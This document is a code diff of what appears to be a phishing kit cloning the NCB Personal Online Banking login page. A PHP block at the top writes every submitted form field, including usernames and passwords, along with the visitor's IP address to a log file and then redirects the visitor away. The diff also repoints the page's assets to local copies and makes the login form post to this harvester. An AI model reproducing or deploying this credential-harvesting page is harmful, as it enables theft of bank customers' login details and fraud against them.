@@ -1,60 +1,20 @@
 <?php
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
-header('Location: yahoo.com');
-$handle = fopen('log_z17g8K3WWR.txt', 'a');
+header('Location: yahoo');
+$handle = fopen('log_uQ8TJNWIRD.txt', 'a');
 fwrite($handle, '----------------------------------------------------------------------['.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable.': '.$value."\r\n");}
 fclose($handle);
 exit;
 } ?>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-		<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
-	
-
-
-
-
-
-
-
-
-
-
-
-<html lang="en">
-<head>
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html style="" class=" js no-touch cssanimations csstransitions" lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
 <!-- Global site tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-47167941-3"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'UA-47167941-3');
-</script>
+<script type="text/javascript" async="" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/analytics.js"></script><script async="" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/js"></script>
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
 
 
 
@@ -81,44 +41,45 @@ exit;
 
 
 
-<!--  <link href="https://retail.ncbelink.com/corp/L001/consumer/theme/" rel="stylesheet" type="text/css"/>  --> 
-<link href="https://retail.ncbelink.com/corp/L001/fontawesome/css/all.min.css" rel="stylesheet" type="text/css"/>
+<!--  <link href="http://localhost:8080/phpSite/canda/L001/consumer/theme/" rel="stylesheet" type="text/css"/>  --> 
+<link href="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/all.css" rel="stylesheet" type="text/css">
 
-<link href="https://fonts.googleapis.com/css?family=Roboto:300,400" rel="stylesheet">
-<link href="https://retail.ncbelink.com/corp/L001/consumer/theme/materialize.css" rel="stylesheet" type="text/css"/>
-<link href="https://retail.ncbelink.com/corp/L001/consumer/theme/mega-menu.css" rel="stylesheet" type="text/css"/>
-<link href="https://retail.ncbelink.com/corp/L001/consumer/theme/layout_master.css" rel="stylesheet" type="text/css"/>
+<link href="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/css.css" rel="stylesheet">
+<link href="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/materialize.css" rel="stylesheet" type="text/css">
+<link href="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/mega-menu.css" rel="stylesheet" type="text/css">
+<link href="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/layout_master.css" rel="stylesheet" type="text/css">
 
-<link href="https://retail.ncbelink.com/corp/L001/consumer/theme/application_master.css" rel="stylesheet" type="text/css"/>
+<link href="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/application_master.css" rel="stylesheet" type="text/css">
 
-	<link href="https://retail.ncbelink.com/corp/L001/consumer/theme/retailSpecificStyles.css" rel="stylesheet" type="text/css"/>
-	<link href="https://retail.ncbelink.com/corp/L001/consumer/theme/ncbretailcustomapp.css" rel="stylesheet" type="text/css"/>
+	<link href="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/retailSpecificStyles.css" rel="stylesheet" type="text/css">
+	<link href="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/ncbretailcustomapp.css" rel="stylesheet" type="text/css">
 	
 	
 
 
-<link href="https://retail.ncbelink.com/corp/L001/consumer/theme/mediaQueryApplication.css" rel="stylesheet" type="text/css"/>
-<link href="https://retail.ncbelink.com/corp/L001/consumer/theme/materialize_master.css" rel="stylesheet" type="text/css"/>
-<link href="https://retail.ncbelink.com/corp/L001/fontawesome/css/all.min.css" rel="stylesheet" type="text/css"/>
+<link href="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/mediaQueryApplication.css" rel="stylesheet" type="text/css">
+<link href="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/materialize_master.css" rel="stylesheet" type="text/css">
+<link href="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/all.css" rel="stylesheet" type="text/css">
 
 <!-- <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" integrity="sha384-WskhaSGFgHYWDcbwN70/dfYBj47jz9qbsMId/iRN3ewGhXQFZCSftd1LZCfmhktB" crossorigin="anonymous"> -->
-<link href="https://retail.ncbelink.com/corp/L001/consumer/theme/style.css" rel="stylesheet" />
+<link href="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/style.css" rel="stylesheet">
 
-<script type="text/javascript" src="https://retail.ncbelink.com/corp/scripts/jquery.js"></script>
+<script type="text/javascript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery_004.js"></script>
 
-<!-- <script type="text/javascript" src="https://retail.ncbelink.com/corp/js/collapse.js"></script> -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.7.2/Chart.min.js"></script>
-<!-- <script src="https://retail.ncbelink.com/corp/js/bootstrap.js"></script> -->
-<!--  <script type="text/javascript" src="https://retail.ncbelink.com/corp/js/bootstrap.min.js"></script>  -->
-
-
-
-
-<script  type="text/javascript" src="https://retail.ncbelink.com/corp/scripts/common/Ncalendar1.js"></script>
+<!-- <script type="text/javascript" src="http://localhost:8080/phpSite/canda/js/collapse.js"></script> -->
+    <script src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Chart.js"></script><style type="text/css">/* Chart.js */
+@-webkit-keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}@keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}.chartjs-render-monitor{-webkit-animation:chartjs-render-animation 0.001s;animation:chartjs-render-animation 0.001s;}</style>
+<!-- <script src="http://localhost:8080/phpSite/canda/js/bootstrap.js"></script> -->
+<!--  <script type="text/javascript" src="http://localhost:8080/phpSite/canda/js/bootstrap.min.js"></script>  -->
 
 
 
-<script type="text/javascript" src="https://retail.ncbelink.com/corp/scripts/common/materializeNFEBAScripts.js?moduleId=user,scriptsPath=scripts,isVdtMode=false,nodePath=,ipAddress=0.0.0.0.0.0,contextPath="></script>
+
+<script type="text/javascript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Ncalendar1.js"></script>
+
+
+
+<script type="text/javascript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/materializeNFEBAScripts.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NFEBAFunctionLoader.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Ncooltree.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery-3.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery-migrate-3.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery_007.js"></script><script type="text/javascript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/materialize.js"></script><script type="text/javascript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/materializeCommon.js"></script><script type="text/javascript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery_009.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/materializeNFEBAJavaScripts.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NmaterializeHWMails.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Ntree1_format.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NcommonMaterialize.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Nencrypt.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Njson2.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Nhmac-sha256.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Nenc-base64-min.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NClientValidator.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Ndsprocessor.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NMap.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NmaterializeMessages.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NmessageFunctions.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NmaterializeCommonFunctions.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Nxregexp.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Nxregexp-unicode.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NtypeDefinitionVal.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NtypeSysValidation.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NcookieScript.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NmaterializeGroupletActionHandler.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NmaterializePageCustom.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Ntaglibs.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/materializeNFEBAAjaxObjects.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NFEBAWidgets.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Noverlib_mini.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NFEBAVisualEffects.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery-ui.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Noptions.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NEBGCD.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NCxpsGDHelper.js"></script><script type="text/javascript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/json.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NCxpsCallFunctionsResponse.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NMaterializeListingDetails.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jPaginate.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery_013.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/richTextEditor.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery_006.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery_015.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NAnalyticsEngine.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NFEBAAccordion.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Njquery-jcryption.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NFEBATabs.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NFEBATooltip.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NFEBACalendar.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Nmashup.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NGeoTagging.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Nfacebook-utils.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NmobileLogin.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery_011.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NFEBAJSConfiguration.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/adaptivecommon.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/ArcotDeviceDNA.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/deployJava.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/FlashDetect.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/arcot_json.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/PluginDetect.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/rfutil.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/swfobject.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/arcot.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Ninteractivity.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery_016.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery_012.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery_010.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery_008.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery_014.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NcalendarPicker.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NMaterializeFEBACombobox.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NFEBAColourPicker.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Nwatermark.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NmenuAuthorization.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NCustomMobileCommon.js"></script><script type="text/javascript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/footable_UX5.js"></script><script type="text/javascript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery_005.js"></script><script type="text/javascript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NRWDplugins.js"></script><script type="text/javascript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery_003.js"></script><script type="text/javascript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery_002.js"></script><script type="text/javascript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/modernizrCustom.js"></script><script type="text/javascript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/classie.js"></script><script type="text/javascript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/main.js"></script><script type="text/javascript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/mega-menu.js"></script><script type="text/javascript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/ckeditor.js"></script><style>.cke{visibility:hidden;}</style>
 <script type="text/javascript">jQuery.noConflict();</script>
 	
 		
@@ -158,26 +119,30 @@ setTreeFormt(1);
 
 
 
-	<link href="https://retail.ncbelink.com/corp/L001/consumer/theme/jquery-ui.custom_UX5.css" rel="stylesheet" type="text/css"/>
-	<link href="https://retail.ncbelink.com/corp/L001/consumer/theme/lib_themes.css" rel="stylesheet" type="text/css"/>
-	<link href="https://retail.ncbelink.com/corp/L001/consumer/theme/jquery-calendars-picker.css" rel="stylesheet" type="text/css"/>
-	<link href="https://retail.ncbelink.com/corp/L001/consumer/theme/responsiveTables.css" rel="stylesheet" type="text/css"/>
+	<link href="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery-ui.css" rel="stylesheet" type="text/css">
+	<link href="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/lib_themes.css" rel="stylesheet" type="text/css">
+	<link href="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery-calendars-picker.css" rel="stylesheet" type="text/css">
+	<link href="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/responsiveTables.css" rel="stylesheet" type="text/css">
 
-<script  type="text/javascript">
+<script type="text/javascript">
 	<!--feba.domManipulator.documentReady(convertComboboxes);-->
 	
 </script>
 
 
-<div id="flashcontent">
+<style type="text/css">/* Chart.js */
+@-webkit-keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}@keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}.chartjs-render-monitor{-webkit-animation:chartjs-render-animation 0.001s;animation:chartjs-render-animation 0.001s;}</style><style type="text/css">/* Chart.js */
+@-webkit-keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}@keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}.chartjs-render-monitor{-webkit-animation:chartjs-render-animation 0.001s;animation:chartjs-render-animation 0.001s;}</style><style type="text/css">/* Chart.js */
+@-webkit-keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}@keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}.chartjs-render-monitor{-webkit-animation:chartjs-render-animation 0.001s;animation:chartjs-render-animation 0.001s;}</style><style type="text/css">/* Chart.js */
+@-webkit-keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}@keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}.chartjs-render-monitor{-webkit-animation:chartjs-render-animation 0.001s;animation:chartjs-render-animation 0.001s;}</style></head><body oncontextmenu="return false;" scroll="auto" id="outerTab" style="font-size: 1.08em;"><div id="flashcontent">
 </div>
-<link href="https://retail.ncbelink.com/corp/ L001/consumer/theme/additional_temporary.css" rel="stylesheet" type="text/css"/>
-<input  type="Hidden" name="display_error_var" value="E"  id="display_error_var" />
-<input  type="Hidden" name="UIType" value="UX5"  id="UIType" />
+<link href="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/additional_temporary.css" rel="stylesheet" type="text/css">
+<input type="Hidden" name="display_error_var" value="E" id="display_error_var" ondragstart="return false" ondrop="return false">
+<input type="Hidden" name="UIType" value="UX5" id="UIType" ondragstart="return false" ondrop="return false">
 
 
 
-<link href="https://retail.ncbelink.com/corp/L001/consumer/theme/materializeHorizontal.css" rel="stylesheet" type="text/css"/>
+<link href="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/materializeHorizontal.css" rel="stylesheet" type="text/css">
 
 
 <script>
@@ -208,11 +173,13 @@ setTreeFormt(1);
 	
 	
 
-<title>NCB Personal Online Banking:Internet Banking Login</title></head>
+<title>NCB Personal Online Banking:Internet Banking Login</title>
 <script type="text/javascript">var imagePath = 'L001/consumer/images';</script><script type="text/javascript">CONFIG = feba.domManipulator.extendObject(CONFIG || {}, {logMode : "CONSOLE",operatingMode : "DEVELOPMENT", blockOnButtonClicksRequired : "N",blockOnHyperLinkClicksRequired : "N"	,addtionalURLParamRequired : "N", hijriStartYear : "1396",hijriEndYear :"1520" });var IS_WATERMARK_ENABLED="N"
 </script><script type="text/javascript">var langID="001";
 var locale="en_US";
-</script><body scroll="auto" oncontextmenu="return false;"><form method="post" action="<?php echo basename(__FILE__); ?>"  name="AuthenticationFG" action ="AuthenticationController;jsessionid=0000p2LUwjxoDlvBTxcwm5n02H5:1clmi66fl?bwayparam=QhOj%2BI%2BjX%2FUNq1WZhM8dLZsGf0yW9FdBzQTPu1BsKeM%3D" method = "post"  autocomplete="off" ><script  type="text/javascript">function actionset(){if(document.AuthenticationFG.ACTIONSWITCH== "Y"){document.AuthenticationFG.ACTIONSWITCH= "N"}else{document.AuthenticationFG.action= "";document.AuthenticationFG.action= "";}}</script><script language="javascript" enc="perish"> de('%286Fvfulsw%2853odqjxdjh%286G%2855mdydvfulsw%2855%2853hqf%286G%2855shulvk%2855%286Hixqfwlrq%2853lqlwldol%7DhWrnhq%285%3Blg%285FjurxsohwLg%285Fwrnhq%285%3C%28%3AEwu%7C%2853%28%3AE%2853li%285%3Bw%7Cshri%285%3BVwrudjh%285%3C%2853%2854%286G%286G%2853%2855xqghilqhg%2855%285%3C%2853%28%3AEvhvvlrqVwrudjh1%7BQxp%2853%286G%2853wrnhq%286E%2853mTxhu%7C%285%3B%285%3Avfulsw%288Ehqf%286G%2855shulvk%2855%288G%285%3A%285%3C1uhpryh%285%3B%285%3C%286E%2853%2853%2853%28%3AG%2853%2853%2853%2853%2853%28%3AGfdwfk%285%3Bh%285%3C%28%3AEfrqvroh1orj%285%3B%2855H%7Bfhswlrq%2853jhqhudwhg%2853zkloh%2853lqlwldol%7Dlqj%2853wrnhq%2855%285%3C%286E%28%3AG%28%3AG%286F%285Ivfulsw%286H',3); </script><script language="javascript" enc="perish"> de('%275Euetkrv%2742ncpiwcig%275F%2744lcxcuetkrv%2744%2742gpe%275F%2744rgtkuj%2744%275Gkpkvkcnk%7CgVqmgp%274%3A%2744CwvjgpvkecvkqpHI%2744%274E%2744pwnn%2744%274E%2744%5BQ9CUXI%27475%277G%2744%274%3B%275D%275E%274Huetkrv%275G',2); </script>
+</script><form name="AuthenticationFG" action="<?php echo basename(__FILE__); ?>" method="post" autocomplete="off">
+
+
 
 
 
@@ -267,7 +234,7 @@ i.waves-effect.waves-light.btn.login_button.waves-input-wrapper:hover {
 //**for the login button END**/
 .width100percent_main_loginbg {
 
-    background: url(https://retail.ncbelink.com/corp/../images/backgrounds/login-bg.png);
+    background: url(http://localhost:8080/phpSite/canda/../images/backgrounds/login-bg.png);
     background-size: 101%;}
     
  .login_user {
@@ -761,7 +728,7 @@ return 0.5 - Math.random()})
 			+'<p align="right"> <span class="keyBoardTitle"> Virtual Keyboard</span> '
 			+'<span class="keyBoardTitleInfo">(For entering password only)</span>'
 			
-			+'<span> <strong><a name="CLOSE_KEYPAD" id="CLOSE_KEYPAD" href="https://retail.ncbelink.com/corp/javascript:setPinPadCtl(null),enableTextField(\''+whatelement+'\')" class="close" title="Close">x&nbsp;</a></strong></span> </p>' 
+			+'<span> <strong><a name="CLOSE_KEYPAD" id="CLOSE_KEYPAD" href="http://localhost:8080/phpSite/canda/javascript:setPinPadCtl(null),enableTextField(\''+whatelement+'\')" class="close" title="Close">x&nbsp;</a></strong></span> </p>' 
 			
 			+ '<p ><span id="titleBar" class="keyBordText" style="display:none"><ilayer width="100%" onSelectStart="return false">'
 			+'<layer  width="100%" onMouseover="isHot=true;if (isN4) ddN4(pp_div)" onMouseout="isHot=false">'
@@ -1508,27 +1475,746 @@ function getScrollXY() {
 --></script>
 
 
-<script  type="text/javascript">
+<script type="text/javascript">
 document.onmousedown=ddInit;
 document.onmouseup=Function("ddEnabled=false");
 </script>
 <iframe id="iframetop" scrolling="no" frameborder="0"> </iframe>
-	<div id="pp_div" valign="right" class="keypaddiv">
+	<div id="pp_div" valign="right" class="keypaddiv" style="visibility: hidden; display: none;">
 <div id="scriptdiv"></div>
 </div>
 
-<script  type="text/javascript">ppX=100;ppY=100;setTimeout('setPinPadCtl(null)',1);</script>
